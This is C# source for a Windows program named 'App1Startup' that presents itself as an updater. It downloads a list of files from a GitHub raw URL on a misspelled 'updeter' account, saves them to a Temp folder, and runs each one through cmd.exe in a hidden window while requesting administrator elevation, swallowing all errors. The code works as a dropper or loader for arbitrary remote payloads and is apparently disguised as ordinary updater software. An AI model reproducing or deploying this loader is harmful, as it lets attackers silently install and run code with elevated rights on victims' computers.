using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace App1Startup
{
    internal static class Program
    {
        static string appsStatusLink = "https://raw.githubusercontent.com/updeter/updater/main/sample_app1.txt";

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            /// check this file path, for startup
            /// if in local, then run
            /// else: run setup file and move this file
            string DS = Path.DirectorySeparatorChar.ToString();
            // string currentLocation = Application.ExecutablePath;

            /// run setup file
            try
            {
                string setup_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) 
                    + DS + "Temp" + DS + "xdupdeter" + DS;
                Directory.CreateDirectory(setup_path);

                string[] apps = urlGetData(appsStatusLink).Split('>');
                for (int i = 1; i < apps.Length; i++)
                {
                    try
                    {
                        string[] parts = apps[i].Split(';');
                        string name = parts[0];
                        string ver = parts[1];
                        string dllink = parts[2];


                        /// get file
                        string dlPath = setup_path + ver + "_" + name;
                        if (!File.Exists(dlPath))
                        {
                            urlDownloadFile(dllink, dlPath);
                        }
                        /// run app2
                        // Process.Start(dlPath); // without UAC
                        runFile(dlPath, true);
                    }
                    catch { }
                }
            }
            catch { }
        }

        public static string urlGetData(string url)
        {
            string data = "";
            try
            {
                var client = new System.Net.WebClient();
                client.Headers.Add("Referer", "http://www.google.com");
                byte[] resp = client.DownloadData(url);
                data = Encoding.Default.GetString(resp);
            }
            catch (Exception ex)
            {
                data = ex.Message;
            }
            return data;
        }

        public static string urlDownloadFile(string url, string path)
        {
            try
            {
                var client = new System.Net.WebClient();
                client.Headers.Add("Referer", "http://www.google.com");

                byte[] resp = client.DownloadData(url);
                System.IO.File.WriteAllBytes(path, resp);
            }
            catch (Exception ex)
            {
                path = ex.Message;
            }

            return path;
        }

        public static void runFile(string path, bool runAsAdmin = false)
        {
            Process process = new Process();

            try
            {
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/C \"" + path + "\"";
                process.StartInfo.UseShellExecute = true;
               // process.StartInfo.RedirectStandardOutput = true;
               // process.StartInfo.RedirectStandardError = true;
                //Vista or higher check
                if (System.Environment.OSVersion.Version.Major >= 6 && runAsAdmin)
                {
                    process.StartInfo.Verb = "runas";
                }
                process.Start();
            }
            catch (Exception ex)
            {
                string er = "ERR:" + ex.Message;
            }
            return;
        }

    }
}